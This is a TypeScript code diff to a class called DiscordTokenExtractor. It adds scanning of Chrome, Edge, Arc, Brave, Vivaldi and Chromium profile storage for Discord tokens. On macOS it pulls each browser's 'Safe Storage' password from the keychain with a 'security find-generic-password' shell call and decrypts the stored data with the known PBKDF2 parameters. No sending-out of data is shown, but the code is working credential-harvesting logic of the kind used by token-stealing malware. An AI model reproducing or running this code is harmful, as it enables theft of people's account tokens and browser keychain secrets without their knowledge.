@@ -34,6 +34,13 @@ interface CDPMessage {
   error?: { code: number; message: string }
 }
 
+interface BrowserConfig {
+  name: string
+  darwin: string
+  linux: string
+  win32: string
+}
+
 const TOKEN_REGEX = /[\w-]{24,}\.[\w-]{6}\.[\w-]{25,110}/
 const MFA_TOKEN_REGEX = /mfa\.[\w-]{84}/
 const ENCRYPTED_PREFIX = 'dQw4w9WgXcQ:'
@@ -54,6 +61,51 @@ const DISCORD_APP_PATHS: Record<DiscordVariant, { darwin: string }> = {
   canary: { darwin: '/Applications/Discord Canary.app/Contents/MacOS/Discord Canary' },
   ptb: { darwin: '/Applications/Discord PTB.app/Contents/MacOS/Discord PTB' },
 }
+
+const BROWSERS: BrowserConfig[] = [
+  {
+    name: 'Chrome',
+    darwin: join('Google', 'Chrome'),
+    linux: 'google-chrome',
+    win32: join('Google', 'Chrome', 'User Data'),
+  },
+  {
+    name: 'Chrome Canary',
+    darwin: join('Google', 'Chrome Canary'),
+    linux: 'google-chrome-unstable',
+    win32: join('Google', 'Chrome SxS', 'User Data'),
+  },
+  {
+    name: 'Edge',
+    darwin: 'Microsoft Edge',
+    linux: 'microsoft-edge',
+    win32: join('Microsoft', 'Edge', 'User Data'),
+  },
+  {
+    name: 'Arc',
+    darwin: join('Arc', 'User Data'),
+    linux: '',
+    win32: join('Arc', 'User Data'),
+  },
+  {
+    name: 'Brave',
+    darwin: join('BraveSoftware', 'Brave-Browser'),
+    linux: join('BraveSoftware', 'Brave-Browser'),
+    win32: join('BraveSoftware', 'Brave-Browser', 'User Data'),
+  },
+  {
+    name: 'Vivaldi',
+    darwin: 'Vivaldi',
+    linux: 'vivaldi',
+    win32: join('Vivaldi', 'User Data'),
+  },
+  {
+    name: 'Chromium',
+    darwin: 'Chromium',
+    linux: 'chromium',
+    win32: join('Chromium', 'User Data'),
+  },
+]
 
 export class DiscordTokenExtractor {
   private platform: NodeJS.Platform
@@ -92,6 +144,75 @@ export class DiscordTokenExtractor {
     }
   }
 
+  getBrowserLevelDBDirs(): string[] {
+    const dirs: string[] = []
+
+    for (const browser of BROWSERS) {
+      const browserBase = this.getBrowserBasePath(browser)
+      if (!browserBase) continue
+
+      const profileDirs = this.discoverProfileDirs(browserBase)
+      for (const profileDir of profileDirs) {
+        dirs.push(join(profileDir, 'Local Storage', 'leveldb'))
+      }
+    }
+
+    return dirs
+  }
+
+  private getBrowserBasePath(browser: BrowserConfig): string | null {
+    let relative: string
+
+    switch (this.platform) {
+      case 'darwin':
+        relative = browser.darwin
+        if (!relative) return null
+        return join(homedir(), 'Library', 'Application Support', relative)
+      case 'linux':
+        relative = browser.linux
+        if (!relative) return null
+        return join(homedir(), '.config', relative)
+      case 'win32':
+        relative = browser.win32
+        if (!relative) return null
+        return join(
+          process.env.LOCALAPPDATA || join(homedir(), 'AppData', 'Local'),
+          relative,
+        )
+      default:
+        return null
+    }
+  }
+
+  private discoverProfileDirs(browserBase: string): string[] {
+    const dirs: string[] = []
+
+    dirs.push(join(browserBase, 'Default'))
+
+    if (!existsSync(browserBase)) return dirs
+
+    try {
+      const entries = readdirSync(browserBase, { withFileTypes: true })
+      for (const entry of entries) {
+        if (!entry.isDirectory()) continue
+        if (!/^Profile \d+$/i.test(entry.name)) continue
+        dirs.push(join(browserBase, entry.name))
+      }
+    } catch {}
+
+    return dirs
+  }
+
+  private findBrowserBaseDirForPath(path: string): string | null {
+    const parts = path.split(/[/\\]/)
+    for (let levels = 2; levels <= 5; levels++) {
+      if (parts.length < levels) break
+      const base = parts.slice(0, parts.length - levels).join('/')
+      if (existsSync(join(base, 'Local State'))) return base
+    }
+    return null
+  }
+
   getKeychainVariants(): KeychainVariant[] {
     return [
       // Modern Discord (lowercase)
@@ -102,6 +223,14 @@ export class DiscordTokenExtractor {
       { service: 'Discord Safe Storage', account: 'Discord' },
       { service: 'Discord Canary Safe Storage', account: 'Discord Canary' },
       { service: 'Discord PTB Safe Storage', account: 'Discord PTB' },
+      // Browser keychain entries for fallback
+      { service: 'Chrome Safe Storage', account: 'Chrome' },
+      { service: 'Chrome Canary Safe Storage', account: 'Chrome Canary' },
+      { service: 'Microsoft Edge Safe Storage', account: 'Microsoft Edge' },
+      { service: 'Arc Safe Storage', account: 'Arc' },
+      { service: 'Brave Safe Storage', account: 'Brave' },
+      { service: 'Vivaldi Safe Storage', account: 'Vivaldi' },
+      { service: 'Chromium Safe Storage', account: 'Chromium' },
     ]
   }
 
@@ -127,6 +256,11 @@ export class DiscordTokenExtractor {
     const levelDbToken = await this.extractFromLevelDB()
     if (levelDbToken) {
       return levelDbToken
+    }
+
+    const browserToken = await this.extractFromBrowserLevelDB()
+    if (browserToken) {
+      return browserToken
     }
 
     if (this.platform === 'darwin') {
@@ -190,13 +324,31 @@ export class DiscordTokenExtractor {
     return null
   }
 
+  private async extractFromBrowserLevelDB(): Promise<ExtractedDiscordToken | null> {
+    const leveldbDirs = this.getBrowserLevelDBDirs()
+
+    for (const leveldbDir of leveldbDirs) {
+      if (!existsSync(leveldbDir)) continue
+
+      // The browser base dir contains the Local State file needed for Windows decryption
+      const browserBaseDir = this.findBrowserBaseDirForPath(leveldbDir)
+      const tokens = this.extractTokensFromLDBFiles(leveldbDir, browserBaseDir ?? leveldbDir)
+
+      if (tokens.length > 0) {
+        return { token: tokens[0]! }
+      }
+    }
+
+    return null
+  }
+
   private async extractFromDir(discordDir: string): Promise<string | null> {
     const levelDbPath = join(discordDir, 'Local Storage', 'leveldb')
 
     if (!existsSync(levelDbPath)) return null
 
     const tokens = this.extractTokensFromLDBFiles(levelDbPath, discordDir)
-    return tokens.length > 0 ? tokens[0] : null
+    return tokens.length > 0 ? tokens[0]! : null
   }
 
   private extractTokensFromLDBFiles(dbPath: string, discordDir: string): string[] {
@@ -307,11 +459,12 @@ export class DiscordTokenExtractor {
   private decryptMacToken(encryptedData: Buffer, discordDir: string): string | null {
     if (this.cachedKey) {
       const decrypted = this.decryptAESCBC(encryptedData, this.cachedKey)
-      if (decrypted) return decrypted
+      if (decrypted && this.isValidToken(decrypted)) return decrypted
     }
 
     const variant = this.getVariantFromPath(discordDir)
-    const keychainVariants = this.getKeychainVariants().filter((v) => {
+    // Try Discord-specific variants first, then fall back to all browser variants
+    const discordVariants = this.getKeychainVariants().filter((v) => {
       const lowerAccount = v.account.toLowerCase()
       if (variant === 'stable') return lowerAccount === 'discord' || lowerAccount === 'discord key'
       if (variant === 'canary') return lowerAccount === 'discord canary' || lowerAccount === 'discordcanary key'
@@ -319,7 +472,12 @@ export class DiscordTokenExtractor {
       return false
     })
 
-    for (const keychainVariant of keychainVariants) {
+    const browserVariants = this.getKeychainVariants().filter((v) => {
+      const lowerService = v.service.toLowerCase()
+      return !lowerService.includes('discord')
+    })
+
+    for (const keychainVariant of [...discordVariants, ...browserVariants]) {
       try {
         const password = execSync(
           `security find-generic-password -s "${keychainVariant.service}" -a "${keychainVariant.account}" -w 2>/dev/null`,
@@ -328,7 +486,7 @@ export class DiscordTokenExtractor {
 
         const key = pbkdf2Sync(password, 'saltysalt', 1003, 16, 'sha1')
         const decrypted = this.decryptAESCBC(encryptedData, key)
-        if (decrypted) {
+        if (decrypted && this.isValidToken(decrypted)) {
           this.cachedKey = key
           this.keyCache.set('discord', key).catch(() => {})
           return decrypted
